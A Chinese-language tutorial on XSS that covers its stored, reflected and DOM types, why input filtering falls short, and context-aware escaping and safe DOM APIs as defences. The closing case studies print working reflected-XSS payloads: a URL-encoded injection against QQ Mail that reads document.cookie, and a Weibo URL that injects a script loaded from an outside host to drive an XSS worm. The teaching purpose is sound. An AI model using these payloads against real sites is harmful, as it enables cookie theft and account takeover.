# WEB前端安全——XSS和CSRF

# xss是什么
XSS（Cross-site scripting），指的是跨站脚本攻击，攻击者通过向页面A注入代码，达到窃取信息等目的，本质是数据被当作程序执行。XSS危害是很大的，一般XSS可以做到以下的事情：

获取页面的数据，包括dom、cookies、localStorage等
劫持前端逻辑
发送请求
等等

## 例子
在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
在 onload、onerror、onclick 等事件中，注入不受控制代码。
在 style 属性和标签中，包含类似 background-image:url("javascript:..."); 的代码（新版本浏览器已经可以防范）。
在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。
XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。
而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。
在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。
这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？
不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：

来自用户的 UGC 信息
来自第三方的链接
URL 参数
POST 参数
Referer （可能来自不可信的来源）
Cookie （可能来自其他子域注入）


## 分类

### 存储型 XSS
存储型 XSS 的攻击步骤：

攻击者将恶意代码提交到目标网站的数据库中。
用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。


### 反射型 XSS
反射型 XSS 的攻击步骤：

攻击者构造出特殊的 URL，其中包含恶意代码。
用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。
反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。
由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。
POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

## DOM 型 XSS
DOM 型 XSS 的攻击步骤：

攻击者构造出特殊的 URL，其中包含恶意代码。
用户打开带有恶意代码的 URL。
用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

## 预防

通过前面的介绍可以得知，XSS 攻击有两大要素：

攻击者提交恶意代码。
浏览器执行恶意代码。
针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？


### 输入过滤

在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？
答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。
那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？
我们举一个例子，一个正常的用户输入了 5 < 7 这个内容，在写入数据库前，被转义，变成了 5 &lt; 7。
问题是：在提交阶段，我们并不确定内容要输出到哪里。
这里的“并不确定内容要输出到哪里”有两层含义：

用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 &lt; 7 )。
在前端中，不同的位置所需的编码也不同。



当 5 &lt; 7 作为 HTML 拼接页面时，可以正常显示：
<div title="comment">5 &lt; 7</div>
复制代码

当 5 &lt; 7 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。


所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。
当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。
既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：

防止 HTML 中出现注入。
防止 JavaScript 执行时，执行恶意代码。

**预防存储型和反射型 XSS 攻击**

存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

改成纯前端渲染，把代码和数据分隔开。
对 HTML 做充分转义。

### 纯前端渲染

纯前端渲染的过程：

浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
然后浏览器执行 HTML 中的 JavaScript。
JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。

在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。
但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。
在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。

### 转移html

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。
常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 & < > " ' / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：

XSS 安全漏洞
简单转义是否有防护作用

HTML 标签文字内容
有
HTML 属性值
有
CSS 内联样式
无
内联 JavaScript
无
内联 JSON
无
跳转链接
无

所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。
例如 Java 工程里，常用的转义库为 org.owasp.encoder。以下代码引用自 org.owasp.encoder 的官方说明。

````js
<!-- HTML 标签内文字内容 -->
<div><%= Encode.forHtml(UNTRUSTED) %></div>

<!-- HTML 标签属性值 -->
<input value="<%= Encode.forHtml(UNTRUSTED) %>" />

<!-- CSS 属性值 -->
<div style="width:<= Encode.forCssString(UNTRUSTED) %>">

<!-- CSS URL -->
<div style="background:<= Encode.forCssUrl(UNTRUSTED) %>">

<!-- JavaScript 内联代码块 -->
<script>
  var msg = "<%= Encode.forJavaScript(UNTRUSTED) %>";
  alert(msg);
</script>

<!-- JavaScript 内联代码块内嵌 JSON -->
<script>
var __INITIAL_STATE__ = JSON.parse('<%= Encoder.forJavaScript(data.to_json) %>');
</script>

<!-- HTML 标签内联监听器 -->
<button
  onclick="alert('<%= Encode.forJavaScript(UNTRUSTED) %>');">
  click me
</button>

<!-- URL 参数 -->
<a href="/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top">

<!-- URL 路径 -->
<a href="/page/<%= Encode.forUriComponent(UNTRUSTED) %>">

<!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
-->
<a href='<%=
  urlValidator.isValid(UNTRUSTED) ?
    Encode.forHtml(UNTRUSTED) :
    "/404"
%>'>
  link
</a>

````

**预防dom型的xss攻击**


DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。
在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。
如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。
DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，<a> 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。


[参考文档](https://juejin.im/post/6844903685122703367)

````html

<!-- 内联事件监听器中包含恶意代码 -->
<img onclick="UNTRUSTED" onerror="UNTRUSTED" src="data:image/png,">

<!-- 链接内包含恶意代码 -->
<a href="UNTRUSTED">1</a>

<script>
// setTimeout()/setInterval() 中调用恶意代码
setTimeout("UNTRUSTED")
setInterval("UNTRUSTED")

// location 调用恶意代码
location.href = 'UNTRUSTED'

// eval() 中调用恶意代码
eval("UNTRUSTED")
</script>

````

## 减少漏洞

**利用模板引擎**
开启模板引擎自带的 HTML 转义功能。例如：
在 ejs 中，尽量使用 <%= data %> 而不是 <%- data %>；
在 doT.js 中，尽量使用 {{! data } 而不是 {{= data }；
在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 freemarker.core.OutputFormat。
**避免内联事件**
尽量不要使用 onLoad="onload('{{data}}')"、onClick="go('{{action}}')" 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。
**避免拼接 HTML**
前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。
**时刻保持警惕**
在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。
**增加攻击难度，降低攻击后果**
通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。
**主动检测和发现**
可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。

## 经典案例

QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞
攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。
于是攻击者构建出一个 URL，并引导用户去点击：
http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B
用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：
<script>
getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
复制代码浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。
新浪微博名人堂反射型 XSS 漏洞
攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。
于是攻击者构建出一个 URL，然后诱导用户去点击：
http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>
用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：
<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
复制代码浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。